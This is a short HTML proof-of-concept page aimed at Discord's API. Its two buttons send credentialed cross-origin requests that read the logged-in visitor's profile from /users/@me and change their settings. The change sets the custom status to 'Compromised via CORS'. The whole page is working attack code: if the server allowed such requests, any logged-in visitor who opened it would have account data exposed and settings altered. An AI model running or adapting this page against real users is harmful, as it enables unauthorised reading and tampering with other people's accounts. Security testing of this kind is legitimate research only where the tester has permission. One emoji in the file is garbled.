<!DOCTYPE html>
<html>
<head>
  <title>CORS Misconfig Test</title>
</head>
<body>
  <h1>Testing CORS Misconfiguration on Discord</h1>
  <button onclick="testRead()">Test Read Endpoint</button>
  <button onclick="testWrite()">Test Write Endpoint</button>

  <pre id="output" style="white-space: pre-wrap;"></pre>

  <script>
    function log(text) {
      document.getElementById("output").textContent += text + "\n";
    }

    async function testRead() {
      try {
        const res = await fetch("https://discord.com/api/v9/users/@me", {
          method: "GET",
          credentials: "include"
        });
        const text = await res.text();
        log("READ Response:\n" + text);
      } catch (err) {
        log("Error in READ: " + err);
      }
    }

    async function testWrite() {
      try {
        const res = await fetch("https://discord.com/api/v9/users/@me/settings", {
          method: "PATCH",
          credentials: "include",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            theme: "light",
            custom_status: {
              text: "Compromised via CORS ðŸ§¨"
            }
          })
        });
        const text = await res.text();
        log("WRITE Response:\n" + text);
      } catch (err) {
        log("Error in WRITE: " + err);
      }
    }
  </script>
</body>
</html>
